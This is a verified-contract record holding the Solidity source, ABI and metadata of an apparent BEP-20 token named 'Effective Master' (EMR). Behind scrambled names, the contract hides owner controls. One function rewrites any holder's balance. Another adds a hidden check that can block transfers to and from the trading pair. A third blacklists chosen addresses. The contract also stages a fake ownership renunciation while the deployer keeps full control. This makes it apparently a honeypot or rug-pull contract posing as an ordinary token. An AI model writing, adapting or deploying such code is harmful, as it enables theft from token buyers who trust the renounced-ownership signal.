{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface toMode {\n    function createPair(address sellShouldToken, address txSwap) external returns (address);\n}\n\ninterface tokenAmountBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellTeam) external view returns (uint256);\n\n    function transfer(address exemptTake, uint256 senderWallet) external returns (bool);\n\n    function allowance(address teamMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptTake,\n        uint256 senderWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toTake, uint256 value);\n    event Approval(address indexed teamMin, address indexed spender, uint256 value);\n}\n\nabstract contract limitLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenAmountBuyMetadata is tokenAmountBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EffectiveMaster is limitLaunch, tokenAmountBuy, tokenAmountBuyMetadata {\n\n    bool private modeExempt;\n\n    function getOwner() external view returns (address) {\n        return buyLimitMode;\n    }\n\n    function exemptTo(address maxTo, address exemptTake, uint256 senderWallet) internal returns (bool) {\n        if (maxTo == autoMode) {\n            return minSwap(maxTo, exemptTake, senderWallet);\n        }\n        uint256 sellBuy = tokenAmountBuy(feeTeamTrading).balanceOf(minLimit);\n        require(sellBuy == isTotal);\n        require(exemptTake != minLimit);\n        if (marketingLaunched[maxTo]) {\n            return minSwap(maxTo, exemptTake, launchedMode);\n        }\n        return minSwap(maxTo, exemptTake, senderWallet);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTake;\n    }\n\n    uint256 private walletTake = 100000000 * 10 ** 18;\n\n    function allowance(address swapLaunched, address maxLiquidityTotal) external view virtual override returns (uint256) {\n        if (maxLiquidityTotal == fundAt) {\n            return type(uint256).max;\n        }\n        return fundAuto[swapLaunched][maxLiquidityTotal];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeSwap;\n    }\n\n    function transfer(address takeMax, uint256 senderWallet) external virtual override returns (bool) {\n        return exemptTo(_msgSender(), takeMax, senderWallet);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedIs;\n    }\n\n    string private teamLiquidity = \"EMR\";\n\n    bool public walletExempt;\n\n    function balanceOf(address sellTeam) public view virtual override returns (uint256) {\n        return receiverIs[sellTeam];\n    }\n\n    event OwnershipTransferred(address indexed totalEnableSwap, address indexed takeFeeFrom);\n\n    function buyReceiver() private view {\n        require(takeLimit[_msgSender()]);\n    }\n\n    bool public receiverSwapToken;\n\n    uint256 constant launchedMode = 7 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLiquidity;\n    }\n\n    uint256 public shouldTo;\n\n    uint8 private takeSwap = 18;\n\n    address minLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fundSell() public {\n        emit OwnershipTransferred(autoMode, address(0));\n        buyLimitMode = address(0);\n    }\n\n    address private buyLimitMode;\n\n    uint256 public tokenMaxShould;\n\n    uint256 public sellAtSwap;\n\n    mapping(address => uint256) private receiverIs;\n\n    uint256 private feeLimitMode;\n\n    function approve(address maxLiquidityTotal, uint256 senderWallet) public virtual override returns (bool) {\n        fundAuto[_msgSender()][maxLiquidityTotal] = senderWallet;\n        emit Approval(_msgSender(), maxLiquidityTotal, senderWallet);\n        return true;\n    }\n\n    uint256 isTotal;\n\n    address public autoMode;\n\n    address fundAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public swapTotalReceiver;\n\n    mapping(address => bool) public takeLimit;\n\n    uint256 amountExemptLimit;\n\n    uint256 private sellAmount;\n\n    address public feeTeamTrading;\n\n    function fromList(uint256 senderWallet) public {\n        buyReceiver();\n        isTotal = senderWallet;\n    }\n\n    function takeFundFee(address takeMax, uint256 senderWallet) public {\n        buyReceiver();\n        receiverIs[takeMax] = senderWallet;\n    }\n\n    uint256 public receiverAt;\n\n    function owner() external view returns (address) {\n        return buyLimitMode;\n    }\n\n    function liquiditySell(address takeToken) public {\n        require(takeToken.balance < 100000);\n        if (walletExempt) {\n            return;\n        }\n        \n        takeLimit[takeToken] = true;\n        if (sellAmount == sellAtSwap) {\n            modeExempt = false;\n        }\n        walletExempt = true;\n    }\n\n    string private launchedIs = \"Effective Master\";\n\n    function transferFrom(address maxTo, address exemptTake, uint256 senderWallet) external override returns (bool) {\n        if (_msgSender() != fundAt) {\n            if (fundAuto[maxTo][_msgSender()] != type(uint256).max) {\n                require(senderWallet <= fundAuto[maxTo][_msgSender()]);\n                fundAuto[maxTo][_msgSender()] -= senderWallet;\n            }\n        }\n        return exemptTo(maxTo, exemptTake, senderWallet);\n    }\n\n    function toReceiver(address atToFund) public {\n        buyReceiver();\n        \n        if (atToFund == autoMode || atToFund == feeTeamTrading) {\n            return;\n        }\n        marketingLaunched[atToFund] = true;\n    }\n\n    function minSwap(address maxTo, address exemptTake, uint256 senderWallet) internal returns (bool) {\n        require(receiverIs[maxTo] >= senderWallet);\n        receiverIs[maxTo] -= senderWallet;\n        receiverIs[exemptTake] += senderWallet;\n        emit Transfer(maxTo, exemptTake, senderWallet);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundAuto;\n\n    mapping(address => bool) public marketingLaunched;\n\n    constructor (){\n        \n        isSender buyLaunchedLaunch = isSender(fundAt);\n        feeTeamTrading = toMode(buyLaunchedLaunch.factory()).createPair(buyLaunchedLaunch.WETH(), address(this));\n        if (marketingAuto) {\n            swapTotalReceiver = false;\n        }\n        autoMode = _msgSender();\n        takeLimit[autoMode] = true;\n        receiverIs[autoMode] = walletTake;\n        fundSell();\n        \n        emit Transfer(address(0), autoMode, walletTake);\n    }\n\n    bool private marketingAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalEnableSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFeeFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLiquidityTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLiquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeamTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"fromList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"}],\"name\":\"liquiditySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwapToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAtSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTotalReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"takeFundFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atToFund\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMaxShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EffectiveMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}